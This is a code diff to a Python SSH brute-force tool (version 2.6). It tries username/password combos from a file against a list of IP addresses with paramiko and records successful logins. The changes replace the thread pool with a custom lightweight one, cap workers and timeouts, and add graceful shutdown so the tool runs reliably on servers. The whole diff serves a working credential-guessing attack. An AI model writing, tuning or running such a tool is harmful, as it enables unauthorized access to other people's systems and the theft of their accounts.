@@ -15,16 +15,17 @@ import subprocess
 import re
 import math
 import signal
+import queue
+import gc
 from datetime import datetime, timedelta
 from typing import List, Dict, Set, Tuple, Optional
 from dataclasses import dataclass
-from concurrent.futures import ThreadPoolExecutor
 import paramiko
 import socket
 
 # Constants
 VERSION = "2.6"
-CONCURRENT_PER_WORKER = 25
+CONCURRENT_PER_WORKER = 10  # Reduced from 25 for lighter load
 
 # Global variables
 start_time = None
@@ -35,6 +36,7 @@ timeout = 0
 max_connections = 0
 successful_ips = set()
 map_mutex = threading.Lock()
+shutdown_flag = threading.Event()
 
 @dataclass
 class SSHTask:
@@ -527,9 +529,86 @@ def format_time(seconds: float) -> str:
 
 def calculate_optimal_buffers() -> int:
     """Calculate optimal buffer sizes based on worker capacity"""
-    # Task Buffer = Workers × Concurrent_Per_Worker × 1.5 (Safety factor)
-    task_buffer = int(float(max_connections * CONCURRENT_PER_WORKER) * 1.5)
+    # Much smaller buffer to reduce memory usage
+    task_buffer = min(max_connections * 5, 200)  # Max 200 tasks in queue
     return task_buffer
+
+class LightweightThreadPool:
+    """Ultra-lightweight thread pool for server environments"""
+    
+    def __init__(self, max_workers: int, max_concurrent_per_worker: int):
+        self.max_workers = max_workers
+        self.max_concurrent_per_worker = max_concurrent_per_worker
+        self.task_queue = queue.Queue(maxsize=calculate_optimal_buffers())
+        self.workers = []
+        self.semaphore = threading.Semaphore(max_concurrent_per_worker)
+        self.shutdown = threading.Event()
+        self.active_tasks = 0
+        self.active_tasks_lock = threading.Lock()
+        
+    def start_workers(self):
+        """Start worker threads"""
+        for i in range(self.max_workers):
+            worker = threading.Thread(target=self._worker_loop, daemon=True)
+            worker.start()
+            self.workers.append(worker)
+    
+    def _worker_loop(self):
+        """Worker thread main loop"""
+        while not self.shutdown.is_set():
+            try:
+                # Get task with timeout to allow shutdown
+                task = self.task_queue.get(timeout=1.0)
+                if task is None:  # Shutdown signal
+                    break
+                    
+                # Process task with concurrency control
+                self.semaphore.acquire()
+                try:
+                    with self.active_tasks_lock:
+                        self.active_tasks += 1
+                    
+                    process_ssh_task(task)
+                    
+                finally:
+                    with self.active_tasks_lock:
+                        self.active_tasks -= 1
+                    self.semaphore.release()
+                    self.task_queue.task_done()
+                    
+            except queue.Empty:
+                continue
+            except Exception as e:
+                print(f"Worker error: {e}")
+                continue
+    
+    def submit(self, task):
+        """Submit task to pool"""
+        try:
+            self.task_queue.put(task, timeout=5.0)
+        except queue.Full:
+            # If queue is full, process task directly to prevent blocking
+            process_ssh_task(task)
+    
+    def shutdown_pool(self):
+        """Shutdown thread pool gracefully"""
+        self.shutdown.set()
+        
+        # Send shutdown signals to workers
+        for _ in self.workers:
+            self.task_queue.put(None)
+        
+        # Wait for workers to finish
+        for worker in self.workers:
+            worker.join(timeout=2.0)
+        
+        # Force garbage collection
+        gc.collect()
+    
+    def get_active_count(self):
+        """Get number of active tasks"""
+        with self.active_tasks_lock:
+            return self.active_tasks
 
 def banner():
     """Display banner with statistics"""
@@ -585,41 +664,66 @@ def banner():
         time.sleep(0.5)
 
 def setup_enhanced_worker_pool(combos: List[List[str]], ips: List[List[str]]):
-    """Enhanced worker pool system"""
-    # Calculate optimal buffer sizes using enhanced algorithm
-    task_buffer_size = calculate_optimal_buffers()
+    """Ultra-lightweight worker pool system optimized for servers"""
     
-    # Create channels with calculated buffer sizes
-    task_queue = []
+    # Calculate optimal settings for server environment
+    optimal_workers = min(max_connections, 8)  # Max 8 workers for server safety
+    optimal_concurrent = min(CONCURRENT_PER_WORKER, 5)  # Max 5 concurrent per worker
     
-    # Generate and send tasks
-    for combo in combos:
-        for ip in ips:
-            task = SSHTask(
-                IP=ip[0],
-                Port=ip[1],
-                Username=combo[0],
-                Password=combo[1],
-            )
-            task_queue.append(task)
+    print(f"Using {optimal_workers} workers with {optimal_concurrent} concurrent connections each")
+    
+    # Create lightweight thread pool
+    thread_pool = LightweightThreadPool(optimal_workers, optimal_concurrent)
+    thread_pool.start_workers()
     
     # Start progress banner
     banner_thread = threading.Thread(target=banner, daemon=True)
     banner_thread.start()
     
-    # Process tasks with thread pool
-    with ThreadPoolExecutor(max_workers=max_connections) as executor:
-        futures = []
-        for task in task_queue:
-            future = executor.submit(process_ssh_task, task)
-            futures.append(future)
-        
+    # Process tasks in small batches to prevent memory overload
+    batch_size = 50  # Process 50 tasks at a time
+    total_tasks = 0
+    
+    try:
+        for combo in combos:
+            for ip in ips:
+                if shutdown_flag.is_set():
+                    break
+                    
+                task = SSHTask(
+                    IP=ip[0],
+                    Port=ip[1],
+                    Username=combo[0],
+                    Password=combo[1],
+                )
+                
+                thread_pool.submit(task)
+                total_tasks += 1
+                
+                # Process in batches to prevent memory buildup
+                if total_tasks % batch_size == 0:
+                    time.sleep(0.1)  # Brief pause between batches
+                    gc.collect()  # Force garbage collection
+                    
         # Wait for all tasks to complete
-        for future in futures:
-            future.result()
+        while not thread_pool.task_queue.empty() or thread_pool.get_active_count() > 0:
+            if shutdown_flag.is_set():
+                break
+            time.sleep(0.5)
+            
+    except KeyboardInterrupt:
+        print("\nShutdown requested...")
+        shutdown_flag.set()
+    finally:
+        # Graceful shutdown
+        thread_pool.shutdown_pool()
+        print("Thread pool shutdown complete")
 
 def process_ssh_task(task: SSHTask):
-    """Process individual SSH task"""
+    """Process individual SSH task with resource optimization"""
+    if shutdown_flag.is_set():
+        return
+        
     # SSH connection configuration
     config = paramiko.SSHClient()
     config.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -627,15 +731,15 @@ def process_ssh_task(task: SSHTask):
     connection_start_time = time.time()
     
     try:
-        # Test connection
+        # Test connection with shorter timeout for faster failure
         config.connect(
             hostname=task.IP,
             port=int(task.Port),
             username=task.Username,
             password=task.Password,
-            timeout=timeout,
-            banner_timeout=timeout,
-            auth_timeout=timeout,
+            timeout=min(timeout, 10),  # Max 10 second timeout
+            banner_timeout=min(timeout, 5),
+            auth_timeout=min(timeout, 5),
             look_for_keys=False,
             allow_agent=False
         )
@@ -678,12 +782,32 @@ def process_ssh_task(task: SSHTask):
         config.close()
         
     except Exception as e:
-        # Error handling
-        stats["errors"] += 1
+        # Error handling - only count as error if not shutdown
+        if not shutdown_flag.is_set():
+            stats["errors"] += 1
+    finally:
+        # Ensure connection is closed
+        try:
+            config.close()
+        except:
+            pass
+        
+        # Periodic garbage collection for memory management
+        if stats["goods"] % 50 == 0:  # Every 50 successful connections
+            gc.collect()
+
+def signal_handler(signum, frame):
+    """Handle shutdown signals gracefully"""
+    print(f"\nReceived signal {signum}. Shutting down gracefully...")
+    shutdown_flag.set()
 
 def main():
-    """Main function"""
+    """Main function with server-optimized settings"""
     global start_time, total_ip_count, ip_file, timeout, max_connections
+    
+    # Set up signal handlers for graceful shutdown
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
     
     create_combo_file(None)
     ip_file = input("Enter the IP list file path: ").strip()
@@ -691,16 +815,33 @@ def main():
     timeout = int(input("Enter the timeout value (seconds): "))
     max_connections = int(input("Enter the maximum number of workers: "))
     
+    # Server safety limits
+    if max_connections > 20:
+        print("⚠️  Warning: Reducing workers to 20 for server safety")
+        max_connections = 20
+    
+    if timeout > 30:
+        print("⚠️  Warning: Reducing timeout to 30s for server safety")
+        timeout = 30
+    
     start_time = time.time()
     
     combos = get_items("combo.txt")
     ips = get_items(ip_file)
     total_ip_count = len(ips) * len(combos)
     
-    # Enhanced worker pool system
-    setup_enhanced_worker_pool(combos, ips)
+    print(f"Total tasks to process: {total_ip_count}")
+    print("Starting ultra-lightweight worker pool...")
     
-    print("Operation completed successfully!")
+    try:
+        # Enhanced worker pool system
+        setup_enhanced_worker_pool(combos, ips)
+        print("Operation completed successfully!")
+    except Exception as e:
+        print(f"Error during execution: {e}")
+    finally:
+        shutdown_flag.set()
+        print("Cleanup complete")
 
 if __name__ == "__main__":
     main()
